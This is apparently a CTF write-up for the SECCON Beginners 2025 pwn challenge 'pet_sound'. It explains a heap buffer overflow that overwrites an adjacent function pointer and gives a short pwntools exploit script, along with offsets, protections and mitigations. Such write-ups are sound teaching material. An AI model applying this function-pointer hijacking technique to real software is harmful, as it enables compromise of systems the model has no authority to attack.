# pet_sound - SECCON Beginners 2025 PWN

## Challenge Overview

**Category:** PWN  
**Difficulty:** Beginner  
**Competition:** SECCON Beginners 2025  

This is a heap exploitation challenge that demonstrates a buffer overflow vulnerability leading to function pointer hijacking.

## Challenge Description

The challenge presents a simple pet sound program where users can input new sounds for pets. The goal is to hijack the execution flow to call the `speak_flag` function instead of the normal `speak_sound` function.

## Source Code Analysis

### Key Components

The program defines a `Pet` structure with two fields:
```c
struct Pet {
    void (*speak)(struct Pet *p);  // Function pointer at offset 0
    char sound[32];                // Buffer at offset 8
};
```

### Vulnerability Analysis

**Critical Vulnerability:** Buffer Overflow in `main.c:42`

```c
read(0, pet_A->sound, 0x32);  // Reads 0x32 (50) bytes into 32-byte buffer
```

The vulnerability occurs when the program reads 50 bytes (`0x32`) into the 32-byte `sound` buffer of `pet_A`. This creates a buffer overflow that can overwrite adjacent heap memory.

### Memory Layout

The program allocates two `Pet` structures sequentially on the heap:
- `pet_A` at lower address
- `pet_B` at higher address (adjacent to `pet_A`)

When `pet_A->sound` overflows, it overwrites `pet_B->speak` function pointer.

### Heap Layout Visualization

```
pet_A:   [speak_ptr][sound_buffer(32_bytes)]
pet_B:   [speak_ptr][sound_buffer(32_bytes)]  <-- TARGET
         ^
         Overwritten by buffer overflow
```

The overflow allows us to control the function pointer in `pet_B->speak`, enabling us to redirect execution to `speak_flag`.

## Exploitation Strategy

### Attack Vector

1. **Information Leak**: The program provides the address of `speak_flag` function at runtime
2. **Buffer Overflow**: Overflow `pet_A->sound` to overwrite `pet_B->speak`
3. **Function Pointer Hijacking**: Replace `pet_B->speak` with address of `speak_flag`
4. **Execution Hijack**: When `pet_B->speak(pet_B)` is called, it executes `speak_flag` instead

### Payload Construction

```python
payload = cyclic(0x28) + p64(speak_flag)
```

- `cyclic(0x28)`: 40 bytes of padding to reach `pet_B->speak` pointer
- `p64(speak_flag)`: 8-byte address of `speak_flag` function

### Offset Calculation

- `pet_A->sound` starts at offset 8 in `pet_A`
- `pet_B->speak` is 40 bytes away from start of `pet_A->sound`
- Total offset: 32 bytes (remaining in sound) + 8 bytes (to reach pet_B->speak) = 40 bytes

## Exploit Implementation

```python
from pwn import *

p = process('./chall')
# p = remote('pet-sound.challenges.beginners.seccon.jp', 9090)

# Extract speak_flag address from hint
leak = p.recvline_startswith(b'[hint]')[-14:]
speak_flag = int(leak, 16)

# Construct payload: padding + speak_flag address
payload = cyclic(0x28) + p64(speak_flag)
p.sendafter(b'> ', payload)
p.interactive()
```

## Security Analysis

### Binary Protections (checksec output)

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```

Despite strong security protections, the heap-based buffer overflow allows function pointer hijacking without triggering stack canaries or DEP protections.

## Educational Takeaways

### Key Learning Points

1. **Heap Layout Understanding**: Critical importance of understanding how heap allocations are laid out in memory
2. **Function Pointer Vulnerabilities**: Function pointers stored in controllable memory locations present critical attack vectors
3. **Bounds Checking**: Always validate input lengths against buffer sizes
4. **Defense in Depth**: Multiple security mechanisms are needed as single protections can be bypassed

### Debugging Techniques Used

1. **Heap Visualization**: The program includes helpful heap layout visualization for understanding memory layout
2. **Address Leaks**: Information disclosure helps bypass ASLR protections
3. **Pattern Analysis**: Using cyclic patterns to determine exact overflow offsets

### Mitigation Strategies

1. **Input Validation**: Proper bounds checking on all user input
2. **Safe String Functions**: Use `fgets()` or `strlcpy()` instead of unbounded reads
3. **Heap Canaries**: Some allocators provide heap canary protection
4. **Control Flow Integrity (CFI)**: Hardware features like Intel CET provide some protection

## Flag

The challenge reads the flag from `flag.txt` when `speak_flag` is successfully called.

```
flag{fake}
```

